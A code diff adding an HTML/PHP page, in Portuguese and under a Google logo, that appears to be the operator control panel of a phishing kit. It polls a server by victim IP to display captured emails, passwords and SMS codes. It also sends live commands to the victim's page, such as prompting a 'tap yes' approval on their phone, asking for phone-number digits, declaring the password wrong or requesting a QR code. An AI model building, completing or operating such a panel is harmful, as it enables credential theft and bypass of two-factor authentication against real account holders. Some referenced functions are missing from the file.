@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <script src="//code.jquery.com/jquery-3.2.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/howler/2.2.1/howler.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+         atualizarDados(); // Atualizar dados imediatamente ao carregar a página
+   
+         // Atualizar os dados a cada 5 segundos
+         setInterval(atualizarDados, 3000);
+       });
+   
+       function atualizarDados() {
+           var ip = document.getElementById('ip').value;
+         $.ajax({
+           url: "atualizar_dados.php?ip=" + ip, //+ ip,
+           type: 'GET',
+           success: function(response) {
+             $('#dados').html(response);
+             let email = response.email;
+             document.getElementById('email').innerHTML = email;
+   
+             let senha = response.senha;
+             document.getElementById('senha').innerHTML = senha;
+   
+             let status = response.status;
+             document.getElementById('status').innerHTML = status;
+   
+             // let data = response.data_acesso;
+             // document.getElementById('data').innerHTML = data;
+   
+             let codigo = response.codigo;
+             document.getElementById('codigo').innerHTML = codigo;
+   
+           },
+           error: function(xhr, status, error) {
+             console.log(error);
+           }
+         });
+       }
+   
+         function blink_text() {
+       $('.blink').fadeOut(500);
+       $('.blink').fadeIn(500);
+     }
+     setInterval(blink_text, 1000);
+   
+     function exec(cmd){
+       document.getElementById("txtcomando").value = cmd;
+   //  console.log('arroca');
+   console.log(document.getElementById("txtcomando").value);
+   
+   }
+   
+   
+   function toggleInput(checkbox) {
+     var input = document.getElementById("finalnumero");
+     if (checkbox.checked) {
+       input.disabled = false;
+     input.style.display = "block"
+     input.value = ""
+   
+     } else {
+       input.disabled = true;
+     input.value = "Desativado"
+     input.style.display = "none"
+     }
+   }
+   
+   
+   
+   function toggleInput3(checkbox) {
+     var input = document.getElementById("emailescondido");
+     if (checkbox.checked) {
+     input.value = ""
+     input.style.display = "block"
+     } else {
+     input.value = "Desativado"
+     input.style.display = "none"
+     }
+   }
+   
+   function toggleInput4(checkbox) {
+     var input = document.getElementById("inputs");
+     var codigo = document.getElementById("codigo");
+     var modelo = document.getElementById("modelo");
+     if (checkbox.checked) {
+       input.disabled = false;
+     input.style.display = "block"
+     codigo.value = ""
+     modelo.value = ""
+     } else {
+     codigo.value = ""
+     modelo.value = ""
+       input.disabled = true;
+     input.style.display = "none"
+     }
+   }
+   
+   
+   
+   
+   function validarForm(){
+     var cmd = document.getElementById("txtcomando").value;
+     var urlimage = document.getElementById("urlimage").value;
+   
+     if ((cmd === "pedirqrcode") && (urlimage.length === 0)){
+       alert("informe a url da imagem");
+       return false;
+     }
+   
+     return true;
+   }
+   
+   
+   function toggleInput2(checkbox) {
+     var input = document.getElementById("toquesim");
+     if (checkbox.checked) {
+   
+     input.value = "Ativado!"
+     console.log(input.value)
+     } else {
+    
+     input.value = "Desativado"
+     console.log(input.value)
+     }
+   }
+   
+   
+   function enviarsms(){
+   
+   }
+   </script>
+    <style>
+
+        h1 {
+            font-size: 15pt;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+
+        }
+
+        body{
+            width: 100%;
+            height: 100%;
+        }
+
+        .box {
+            
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            font-family: Arial, Helvetica, sans-serif;
+            flex-wrap: 30px;
+            padding: 0px 20px;
+            width: 100vw;
+            
+        }
+
+        a {
+            background-color: blue;
+            padding: 10px 35px;
+            border-radius: 10px;
+
+        }
+        .flex{
+            width: 100%;
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+        }
+
+        .flex9, .flex10{
+            width: 100%;
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+        }
+        .pagina-inicial {
+            display: flex;
+            height: 80vh;
+            width: 40%;
+            min-width: 400px;
+            margin: 0 auto;
+            border: 1px solid black;
+            border-radius: 8px;
+            height: 600px;
+        }
+
+
+
+        #email-digitado {
+            outline: 0;
+            border: none;
+            width: 100px;
+        }
+
+        .newClass {
+            background-color: aliceblue;
+            padding: 10px 30px;
+            border-radius: 10px;
+            color: black;
+        }
+
+        #email {
+            padding: 8px 15px;
+            color: aliceblue;
+            background-color: #1a73e8;
+            opacity: 0.8;
+            border-radius: 10px;
+           
+        }
+
+        .senhax {
+            text-align: center;
+            padding: 8px 15px !important;
+            color: aliceblue !important;
+            background-color: #1a73e8 ;
+            opacity: 0.8 !important;
+            border-radius: 10px !important;
+        }
+
+        #codigo, #numero {
+            border: none;
+            padding: 5px 10px;
+            border-top-left-radius: 10px;
+            border-top-right-radius: 10px;
+            outline: none;
+            border: 1px solid;
+         
+            
+        }
+
+        #dispositivo {
+            outline: none;
+            padding: 5px 10px;
+            border: none;
+            border: 1px solid;
+            border-top: none;
+
+
+        }
+        #botao, #botao23 {
+            outline: none;
+
+            
+border-radius: 10px;
+padding: 10px 30px;
+background-color: #1a73e8;
+color: aliceblue;
+border-top: none;
+height: 35px;
+width: 100%;
+        }
+
+
+        #enviar, #enviar2  {
+            outline: none;
+
+            
+            border-bottom-right-radius: 10px ;
+            border-bottom-left-radius: 10px ;
+            background-color: #1a73e8;
+            color: aliceblue;
+            border-top: none;
+            height: 35px;
+        }
+
+        #enviar:disabled, #enviar2:disabled, #enviar3:disabled, #botao23:disabled {
+            background-color: gray;
+            color: white;
+        }
+
+        #enviar3 {
+            background-color: #1a73e8;
+            color: aliceblue;
+            border-top: none;
+            border-radius: 10px;
+            height: 35px;
+            margin-top: 35px;
+        }
+
+
+
+       
+
+    </style>
+    
+    <script></script>
+</head>
+<body>
+   <div class="pagina-inicial">
+    <div class="box">
+        <img id="cel" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1-1.png" width="150px"/>
+        <h1 id="emailstyle" style="text-align: center;margin-top: 20px !important;margin-bottom: 20px !important;">Email: </h1><p><span style="" id="email"><div id="dados">
+	
+        </div>Aguardando...<span></p>
+        <h1  style="text-align: center;margin-bottom: 20px !important;margin-top:30px;">Senha: </h1><p><span class="senhax" id="senhadashboard">Aguardando...<span></p>
+            <div id="displa" style="display: none;" class="displa">
+                <h1  style="text-align: center;margin-bottom: 20px !important;margin-top:30px;">Codigo SMS: </h1><p><span class="senhax" id="codigosmsdashboard">Aguardando...<span></p>
+            
+            </div>
+            
+            <div class="flex">
+
+                <div style="display:block;margin-top: 35px;" class="flex">
+
+
+
+
+                    <div>
+                        
+<form name="formulario" method="POST" id="formulario" action="comando.php">
+    <input type="hidden" value="<?php echo $ip ?>" id="ip" name="ip">
+    <input type="checkbox" id="checkbox2" name="checkbox2" onchange="toggleInput2(this)">
+
+      <label for="checkbox2"> Toque SIM no seu Aparelho</label>
+      
+      <h1 id="text"></h1>
+      <input type="checkbox" id="checkbox1" name="checkbox1" onchange="toggleInput(this)">
+      <input type="hidden"  id="toquesim" name="toquesim" value="Desativado" />
+      <label for="checkbox1"> Opção de numero de telefone</label></br>
+      <input style="display:none;" type="hidden" id="finalnumero2" name="finalnumero2" value="Desativado" />
+      <label for="checkbox1"><input  placeholder="Digite o Final do Numero" style="display:none;" value="Desativado"  id="finalnumero" name="finalnumero" type="text"></label>
+
+      <br>
+    
+<!--     <input type="checkbox" id="checkbox6" name="checkbox6" onchange="toggleInput3(this)">
+      <input type="hidden" id="email" name="email" value="Desativado" />
+      <label for="checkbox6"> Opção de codigo no E-mail</label></br>
+      <label for="checkbox6"><input style="display:none;"  placeholder="3 Primeiras letras do E-mail" value="Desativado" maxlength="3"  id="emailescondido" name="emailescondido" type="text"></label> -->
+
+
+
+
+    <input type="hidden" id="comando" name="comando" value="qual" />
+    <button class="btn btn-outline-dark" id="botao" type="submit">ENVIAR</button>
+    </form>
+
+                    </div>
+
+                    <div style="flex-direction: column; " class="flex9">
+                        <input  placeholder="Digite o Final do Numero" required id="numero" type="text">
+                        <input placeholder="Ativado/Desativado" value="ativo" type="text" name="ativo" id="ativo">
+                      
+                        <button  onclick="enviarnumero2()" id="enviar2" type="submit">Enviar</button>
+
+                        <button  onclick="enviarnumero3()" id="enviar3" type="submit">SENHA ERRADA</button>
+                       
+                  
+                    </div>
+
+                    <div style="flex-direction: column;margin-top: 30px;display: none;" class="flex10">
+                        <input  placeholder="Digite o Codigo!" required id="codigo" type="text">
+                        <input  placeholder="Digite o Modelo do Dispositivo" required id="dispositivo" type="text"></br>
+                        <button  onclick="enviarnumero()" id="enviar" type="submit">Enviar</button>
+                  
+                    </div>
+
+                   
+                    
+                    <input hidden id="email-escondido" type="text">
+                   
+                </div>
+                
+            </div>
+
+            
+            <button disabled onclick="finalizado()" id="botao23" style="margin-top: 30px;display: block;" type="submit">PRONTO</button>
+            <button onclick="enviarcodigo2()" id="botao" style="margin-top: 30px;display: none;" type="submit">Enviar Codigo</button>
+    </div>
+
+   
+   </div> 
+    
+</body>
+</html>
